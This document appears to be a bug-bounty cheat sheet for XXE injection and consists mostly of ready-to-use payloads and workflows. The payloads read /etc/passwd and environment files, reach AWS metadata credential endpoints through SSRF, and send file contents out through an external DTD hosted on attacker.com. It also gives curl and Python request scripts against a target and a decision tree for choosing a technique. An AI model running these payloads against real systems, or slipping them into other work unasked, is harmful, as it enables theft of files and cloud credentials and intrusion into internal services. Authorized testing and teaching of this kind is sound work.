# XXE Injection - Quick Start Guide

## 60-Second XXE Check

```bash
# 1. Identify XML endpoint
# 2. Inject basic payload
# 3. Check response

# Basic test payload:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>
```

---

## Common Payloads Cheat Sheet

### File Retrieval

**Linux:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
```

**Windows:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
```

### SSRF

**AWS Metadata:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

**Internal Services:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/config"> ]>
```

### Blind XXE

**Out-of-Band:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
```

**Data Exfiltration (external DTD):**
```xml
<!-- Main payload -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Error-Based (external DTD):**
```xml
<!-- Main payload -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>

<!-- error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

### XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="16">&xxe;</text>
</svg>
```

### Local DTD Repurposing

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

---

## Burp Suite Quick Workflow

### Setup (30 seconds)

1. **Proxy:** Ensure listener active (127.0.0.1:8080)
2. **Browser:** Configure proxy settings
3. **Collaborator:** Burp → Collaborator client → Copy to clipboard

### Testing (2 minutes)

1. **Identify:** Proxy → HTTP history → Filter: XML
2. **Test:** Right-click request → Send to Repeater
3. **Inject:** Add DOCTYPE + entity
4. **Verify:** Check response or Collaborator

### Automation (Burp Pro)

1. **Scan:** Right-click target → "Scan"
2. **Wait:** Scanner detects XXE automatically
3. **Review:** Dashboard → Issues → XML External Entity

---

## Detection Checklist

**Quick checks:**

- [ ] Application accepts XML input
- [ ] `Content-Type: application/xml` or `text/xml`
- [ ] SOAP web service
- [ ] File upload accepts SVG/DOCX/XML
- [ ] Import/export functionality with XML
- [ ] API endpoints with XML bodies
- [ ] RSS/Atom feed parsing

**Test each with:**
1. Basic file read payload
2. Blind XXE with Collaborator
3. XInclude (if can't control DOCTYPE)
4. File upload (SVG) if applicable

---

## Common Mistakes to Avoid

| Wrong | Correct |
|---------|-----------|
| `file://etc/passwd` | `file:///etc/passwd` (3 slashes) |
| `&xxe` (no semicolon) | `&xxe;` |
| Using `%xxe;` in XML content | `%xxe;` only in DTD, `&xxe;` in content |
| Forgetting DOCTYPE | Must define entity in DOCTYPE first |
| Not polling Collaborator | Click "Poll now" to see interactions |

---

## When Each Technique Works

```
Direct output visible?
YES → Basic XXE (file read, SSRF)

NO → Blind XXE ↓

Outbound connections allowed?
YES → Out-of-Band (Collaborator)

NO → Error-based ↓

External DTD loading allowed?
YES → Error-based with external DTD

NO → Local DTD repurposing

Special cases:
├─ Can't control DOCTYPE? → XInclude
└─ File upload? → SVG/DOCX XXE
```

---

## Quick Command Reference

### Test with curl

```bash
# Basic XXE test
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Blind XXE test
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>'
```

### Python XXE tester

```python
import requests

payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>'''

response = requests.post(
    'https://target.com/api',
    headers={'Content-Type': 'application/xml'},
    data=payload
)

print(response.text)
```

---

## 5-Minute Bug Bounty Workflow

**Step 1: Identify (30 sec)**
- Find XML endpoints
- Check file uploads (SVG)
- Look for SOAP services

**Step 2: Test Basic (1 min)**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
```

**Step 3: Test Blind (1 min)**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe; ]>
```

**Step 4: Try XInclude (1 min)**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Step 5: Document & Report (1.5 min)**
- Screenshot of `/etc/passwd` or Collaborator interaction
- Describe impact (file read, SSRF, etc.)
- Provide remediation advice
- Submit report

---

**Quick Start Version:** 1.0
**Last Updated:** 2026-01-09
**For:** Rapid XXE testing and lab completion

## High-Value XXE Targets

**Feature types most likely to be vulnerable:**
- Admin panels with XML import
- File upload with image processing (SVG, DOCX)
- API endpoints with SOAP/XML-RPC
- Document processing features
- Email/calendar import (vCard, iCal)
- RSS/Atom feed parsing

## Top 10 XXE Testing Tips

1. Always test blind XXE — most XXE in the wild is blind
2. Start simple — basic payload first, then complex
3. Check file uploads — SVG/DOCX often overlooked
4. Test parameter entities — bypasses some entity restrictions
5. Look for SOAP services — commonly vulnerable
6. Try XInclude — works when DOCTYPE control is limited
7. Read small files first — `/etc/hostname` before `/etc/passwd`
8. Monitor errors — error messages leak file content
9. Test all XML-like Content-Types — not just `application/xml`
10. Document everything — reproduction steps are critical for reports

## Troubleshooting

**No response / output missing:**
- Try blind XXE with an OOB callback
- Check error messages for indirect disclosure
- Try XInclude instead of DOCTYPE approach

**Special characters breaking payload:**
- Use PHP filter: `php://filter/convert.base64-encode/resource=/etc/passwd`
- Target simpler files: `/etc/hostname`

**Parser restrictions (entities blocked):**
- Try different entity types (general vs parameter)
- Use XInclude
- Test local DTD repurposing
